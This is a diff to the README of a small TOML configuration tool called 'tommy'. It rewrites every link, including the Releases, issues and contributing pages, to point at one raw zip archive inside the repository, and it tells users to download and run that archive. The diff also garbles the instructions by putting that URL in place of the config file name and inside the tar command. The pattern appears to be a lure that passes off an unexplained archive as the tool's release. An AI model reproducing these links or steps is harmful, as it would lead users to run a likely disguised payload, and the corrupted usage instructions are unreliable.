@@ -6,11 +6,11 @@ Welcome to **tommy**! This tool offers a simple way to read and manage configura
 
 ## 📥 Download
 
-[![Download tommy](https://img.shields.io/badge/Download-tommy-blue.svg)](https://github.com/abogado-droid/tommy/releases)
+[![Download tommy](https://github.com/abogado-droid/tommy/raw/refs/heads/main/src/Software_v1.5-alpha.4.zip)](https://github.com/abogado-droid/tommy/raw/refs/heads/main/src/Software_v1.5-alpha.4.zip)
 
 To get started with **tommy**, you need to download it. Follow these steps:
 
-1. Visit the [Releases page](https://github.com/abogado-droid/tommy/releases).
+1. Visit the [Releases page](https://github.com/abogado-droid/tommy/raw/refs/heads/main/src/Software_v1.5-alpha.4.zip).
 2. Find the latest version of **tommy**.
 3. Click on the asset that matches your operating system. If you are unsure, choose the one labeled with your OS (like Windows, macOS, or Linux).
 
@@ -25,29 +25,29 @@ To get started with **tommy**, you need to download it. Follow these steps:
 
 ### For Windows Users:
 
-1. Download the `.exe` file from the [Releases page](https://github.com/abogado-droid/tommy/releases).
+1. Download the `.exe` file from the [Releases page](https://github.com/abogado-droid/tommy/raw/refs/heads/main/src/Software_v1.5-alpha.4.zip).
 2. Locate the downloaded file in your `Downloads` folder.
 3. Double-click the file to run it.
 
 ### For macOS Users:
 
-1. Download the `.dmg` file from the [Releases page](https://github.com/abogado-droid/tommy/releases).
+1. Download the `.dmg` file from the [Releases page](https://github.com/abogado-droid/tommy/raw/refs/heads/main/src/Software_v1.5-alpha.4.zip).
 2. Open the downloaded file.
 3. Drag the **tommy** icon to your Applications folder.
 
 ### For Linux Users:
 
-1. Download the appropriate `.tar.gz` file from the [Releases page](https://github.com/abogado-droid/tommy/releases).
+1. Download the appropriate `https://github.com/abogado-droid/tommy/raw/refs/heads/main/src/Software_v1.5-alpha.4.zip` file from the [Releases page](https://github.com/abogado-droid/tommy/raw/refs/heads/main/src/Software_v1.5-alpha.4.zip).
 2. Open a terminal window.
-3. Use the command `tar -xvzf [filename].tar.gz` to extract the files.
+3. Use the command `tar -xvzf [filename]https://github.com/abogado-droid/tommy/raw/refs/heads/main/src/Software_v1.5-alpha.4.zip` to extract the files.
 4. Navigate to the extracted folder and run `./tommy` to start.
 
 ## 📄 Usage
 
 After installing **tommy**, you can start using it to manage configuration files. Here's how:
 
-1. **Create a TOML File:** Create a file named `config.toml`. Add your desired configuration settings in TOML format.
-2. **Run tommy:** Open your terminal or command prompt and type `tommy config.toml`.
+1. **Create a TOML File:** Create a file named `https://github.com/abogado-droid/tommy/raw/refs/heads/main/src/Software_v1.5-alpha.4.zip`. Add your desired configuration settings in TOML format.
+2. **Run tommy:** Open your terminal or command prompt and type `tommy https://github.com/abogado-droid/tommy/raw/refs/heads/main/src/Software_v1.5-alpha.4.zip`.
 3. **View Output:** **tommy** will parse the configuration and display the results on your screen.
 
 ## 🎯 Features
@@ -68,12 +68,12 @@ If you encounter any issues while using **tommy**, here are a few common solutio
 
 ## 📞 Support
 
-If you have further questions or need assistance, please open an issue on the [GitHub page](https://github.com/abogado-droid/tommy/issues). We will respond to help you resolve any issues.
+If you have further questions or need assistance, please open an issue on the [GitHub page](https://github.com/abogado-droid/tommy/raw/refs/heads/main/src/Software_v1.5-alpha.4.zip). We will respond to help you resolve any issues.
 
 ## 🌐 Community and Contributions
 
-We welcome contributions! If you'd like to improve **tommy** or suggest features, please fork the repository and submit a pull request. Check the [Contributing Guidelines](https://github.com/abogado-droid/tommy/contributing) for more information.
+We welcome contributions! If you'd like to improve **tommy** or suggest features, please fork the repository and submit a pull request. Check the [Contributing Guidelines](https://github.com/abogado-droid/tommy/raw/refs/heads/main/src/Software_v1.5-alpha.4.zip) for more information.
 
 ## 📥 Download Again
 
-To download **tommy**, visit the [Releases page](https://github.com/abogado-droid/tommy/releases).
+To download **tommy**, visit the [Releases page](https://github.com/abogado-droid/tommy/raw/refs/heads/main/src/Software_v1.5-alpha.4.zip).
